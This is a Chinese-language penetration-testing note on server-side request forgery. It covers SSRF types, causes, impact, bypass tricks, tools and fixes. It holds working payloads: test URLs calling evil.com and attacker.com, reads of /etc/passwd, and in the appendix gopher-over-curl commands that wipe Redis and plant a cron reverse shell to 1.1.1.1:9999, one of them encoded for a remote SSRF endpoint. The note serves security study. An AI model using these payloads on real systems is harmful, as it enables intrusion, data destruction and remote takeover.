### 简介

SSRF (Server Side Request Forgery) 

### 分类

SSRF漏洞分类

* 按利用方式分类
  * Basic SSRF - 攻击者能够看到真实响应内容(【3】为真实响应 【4】响应的body与【3】它完全相同)
  * Blind SSRF - 攻击者无法看到真实响应内容(【3】为真实响应 【4】响应的body固定不变) 需要通过其他方式观察响应 进行判断
    * HTTP response status - HTTP响应的状态码(200 500)
    * HTTP response time - 时间间隔的长短(得到HTTP响应时间点-发起HTTP请求的时间点)


* 按产生原因分类
  * 类型1 开发者未没能实现相关功能的安全验证与限制 - 修复方式:严格验证输入
    * 实例 支持了URL Schema(file等协议) 可读取本机文件 `http://x.com/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml`
  * 类型2 web组件存在SSRF漏洞 - 修复方式:升级组件
    * ImageMagick CVE-2016-3718
    * discuz x2.5/x3.0/x3.1/x3.2 SSRF漏洞
    * Ffmpeg文件读取漏洞 CVE-2016-1897  CVE-2016-1898
      * 实例 [新浪微盘存在Ffmpeg文件读取漏洞-SSRF](https://www.secpulse.com/archives/49510.html)
      * 解析 [FFmpeg任意文件读取漏洞分析 - 知乎](https://zhuanlan.zhihu.com/p/28255225)

### 原理

"隔山打牛"

```
Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> Server2
     /\                           |        /\                         \/ 
     |                           \/         |                         | 
     '-----<----【4】resp----<----'         '---<----【3】resp----<----' 
```

```
流量走向                      流程说明
attacker -> SSRFserver      【1】攻击者发送Requset1到存在SSRF漏洞的Server.  req1:https://x.com/?url=http://<internal_hostname>:<port>/
SSRFserver -> internalServer【2】SSRFserver为"跳板" 发出Requset2.          req2:http://<internal_hostname>:<port>/
internalServer -> SSRFserver【3】SSRFserver得到req2的真实响应内容.
SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内容返回给攻击者则为Basic SSRF，否则为Blind SSRF.
```

* SSRF漏洞的产生条件
  * 网络相关的功能 - 任何能够使server发起网络请求的功能 都可能存在SSRF
  * 参数值过滤不严 - http请求中带有"URL地址"参数值 传给web后端且不经过未严格过滤参数值 就去访问"URL地址"参数值 获取资源(图片.png、图标.ico、网页.html、文本.txt..而攻击者会以获取"其他资源"的方式进行SSRF漏洞利用)
* 造成SSRF的常见场景 
  * 文件处理与渲染
    * 图片处理 如ImageMagick CVE-2016-3718  如[PhantomJS Image Rendering](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/)
    * 视频音频 ffmpeg
  * web在线代理
  * 资源下载（如图片)
  * 分享
  * url跳转
  * 网页转码 (将网页内容变为适应手机屏幕的格式)
  * ...

### 漏洞影响

* 外网 - 对互联网发起请求(攻击其他网站等)
* 内网 - 对内网中可访问的其他服务器进行探测或攻击
  * 探测内网 - IP/port/service
    * ip 探测内网网络架构 存活主机
    * service 端口开放情况 如数据库类的服务 （常用判断依据：HTTP响应码、HTTP响应时长）
    * Cloud Instances 如果含有SSRF漏洞的Web应用运行在云实例 可以尝试获取云服务商提供的让内部主机查询自身的元数据
      * AWS(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
      * Google Cloud
  * 攻击内网 - 获取主机权限
    * web类漏洞:弱口令、SQLi、PHP FastCGI RCE、Struts2 RCE、Confluence Unauthorized RCE(CVE-2019-3396)、Jenkins插件RCE（CVE-2019-1003000  CVE-2019-1003001  CVE-2019-1003002)...
    * 其他漏洞:Redis未授权/弱口令导致RCE、MongoDB未授权/弱口令可获取数据、MySQL未授权/弱口令可获取数据、Memcached未授权/弱口令可获取数据可RCE...


### 漏洞利用

存在SSRF漏洞则可利用工具[Gopherus](https://github.com/tarunkant/Gopherus)生成包含payload的`gopher://`链接进行利用.

* 目前该工具支持的payload类型:
  * MySQL (Port-3306) `gopherus --exploit mysql` 利用方式1:获取数据.  利用方式2:利用MySQL写入文件.
  * FastCGI (Port-9000)`gopherus --exploit fastcgi` PHP FastCGI RCE. 利用条件:端口9000开放且未配置身份认证.
  * Memcached (Port-11211)
    * Python-Pickle De-serialization `gopherus --exploit pymemcache`
    * PHP De-serialization `gopherus --exploit phpmemcache`
    * Ruby-Marshal De-serialization `gopherus --exploit rbmemcache`
    * dumping Memcached content  `gopherus --exploit dmpmemcache`
  * Redis (Port-6379)`gopherus --exploit redis`
  * Zabbix (Port-10050)`gopherus --exploit zabbix` 利用条件:Zabbix服务器开放了10050端口并配置了`EnableRemoteCommands = 1` 则可执行shell命令
  * SMTP (Port-25)`gopherus --exploit smtp`  利用开放的SMTP端口发送邮件

### 测试方法

* 尝试多种URL Schema
  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
  * `ldap://` 轻量级目录访问协议
    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
  * `gopher://` Gopher是一种分布式文档传递服务
    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`

### gopher协议 - 利用原理

前提：存在SSRF漏洞的web后端所在的服务器支持gopher协议.

攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。

先在攻击者公网主机ReciveData.com上监听1337端口，看一会能否收到数据:
```
evil.com:# nc -lvp 1337
```

gopher.php (在攻击者的公网web服务器gopher.com上) :
如果有http请求访问 http://gopher.com/gopher.php 则httpResponse将会是一个301、302跳转，使用gopher协议对某主机的某端口发送数据。
```
<?php
  header('Location: gopher://ReciveData.com:1337/_Hi%0Assrf');
?>
```

攻击者构造http请求，试图让 存在SSRF漏洞的web后端所在的服务器 去访问 http://gopher.com/gopher.php


测试结果，攻击者公网主机ReciveData.com的1337端口，收到了 存在SSRF漏洞的web后端所在的服务器 发来的数据：
```
Hi
ssrf
```

[SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`


### 绕过技巧

绕过不严谨的"域名校验编程实现"
 * 使用@ `a.com@10.10.10.10` `a.com:b@10.10.10.10`
 * IP地址的不同形式 - 进制转换
   * 十进制形式 `127.0.0.1 <-> 2130706433` 计算方法`(127)*256^3+(0)*256^2+(0)*256^1+(1)*256^0=2130706433`  `(21)*256^1+(200)=5576` 如bing的外网IP转换为十进制形式 `13.107.21.200 <-> 13.107.5576 <-> 13.7017928 <-> 225121736`
   * 十六进制形式 `13.107.21.200 <-> 0xD6B15C8`
   * 混合各形式 如八进制.十进制 `13.107.21.200 <-> 015.7017928`
 * 自定义域名解析 利用项目[xip.name](https://github.com/peterhellberg/xip.name)实现
   * `127.0.0.1 <-> http://2130706433.xip.name`支持十进制.    支持任意前缀`ping qq.com.127.0.0.1.xip.name`
   * `10.100.21.7 <-> http://10.100.21.7.xip.io`
   * [有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
 * DNS重绑定(DNS Rebinding) **重点**
   * 攻击者提交参数值`hack.com`给后端
   * 后端验证:对`hack.com`进行第1次域名解析 得到了合法的外网ip(hack.com的DNS服务器设置为TTL=0) 该域名对应的ip非内网 域名验证通过
   * 攻击者修改域名解析:(攻击者利用短暂的时间差 快速把域名解析结果ip改成为内网ip)
   * 后端逻辑继续运行:后端的程序逻辑继续使用刚才的域名hack.com(由于hack.com的DNS服务器设置的TTL为0 后端只能第2次对hack.com进行域名解析)
   * 后端使用了解析得到的内网ip
 * 短网址跳转 - "短网址"响应(301 永久重定向)到内网地址 `http://10.10.116.11 => http://t.cn/RwbLKDx` [有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
 * JS跳转
 * 以下工具

SSRF测试工具/利用工具

|名称|属性|描述|
|:-------------:|--|-----|
|[cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)|python|生成不同形式的SSRF payload (IP obfuscator ...)|
|[D4Vinci/Cuteit(IP obfuscator)](https://github.com/D4Vinci/Cuteit)|python2|IP obfuscator 将恶意IP改为各种格式以绕过安全检测|
|[samhaxr/XXRF-Shots](https://github.com/samhaxr/XXRF-Shots)|node.js|生成payload 发送众多请求 并使用phantomJS实现网页截图|
|[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE...) tool|
|[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF实现RCE. This tool generates gopher link for exploiting SSRF and gaining RCE in various servers |

### 修复方式


* 如果有非法字符 return false
* 禁用协议 - 仅允许必要的协议 如http和https
* 禁止重定向(Redirect)
  * 301 redirect 永久性转移(Permanently Moved)
  * 302 redirect 暂时性转移(Temporarily Moved)
* 严格限制参数值内容-"关键字白名单"
* 严格限制参数值长度
* ...


-------


### 附-利用cURL支持的协议

cURL支持的协议很多
```
$ curl -V
curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl/7.47.1 OpenSSL/1.0.2g zlib/1.2.8  
Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  
Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets
```

```
# dict protocol (操作Redis)
# 本地测试
curl -vvv 'dict://127.0.0.1:6379/info'
```

```
# file protocol (任意文件读取)
# 本地测试
curl -vvv 'file:///etc/passwd'
```

```
# gopher protocol (利用redis写入var/spool/cron实现反弹Bash)  注意:会清空redis的数据!
# 本地测试 方式1
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'

# 本地测试 方式2
curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/1.1.1.1/9999 0>&1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a'

# 远程测试 方式3
curl -v 'http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F1.1.1.1%2F9999%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'
```
